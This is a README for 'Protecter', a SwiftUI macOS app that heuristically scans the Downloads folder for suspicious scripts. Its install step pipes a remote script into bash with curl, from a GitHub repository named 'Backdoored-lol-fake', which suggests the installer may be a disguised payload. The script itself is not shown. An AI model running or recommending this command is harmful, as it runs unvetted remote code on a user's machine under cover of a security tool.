# Protecter — Native macOS App

Protecter is a standalone SwiftUI macOS application compiled to a native executable inside `Protecter.app`, with a custom `.icns` app icon. It is not an AppleScript wrapper, web app, or background service.

## Install

```bash
curl -fsSL https://raw.githubusercontent.com/ttmeticks-source/Backdoored-lol-fake/main/install.sh | bash
```

Requires macOS 14+ and Apple's Swift compiler. Install Apple's Command Line Tools with `xcode-select --install` if `swiftc` is unavailable. No Homebrew or ClamAV.

## What it does

- Native SwiftUI interface
- Scans files in Downloads when you press Scan Downloads
- Checks common script files for combinations of suspicious command indicators
- Displays matches and lets you reveal each file in Finder
- Does not delete, move, or modify files
- No LaunchAgent or background service

The installer uses a faster non-optimized Swift compile and packages `Protecter.icns` as the Finder app icon. This is a basic heuristic review tool, not a full antivirus. It may miss threats or flag legitimate scripts.
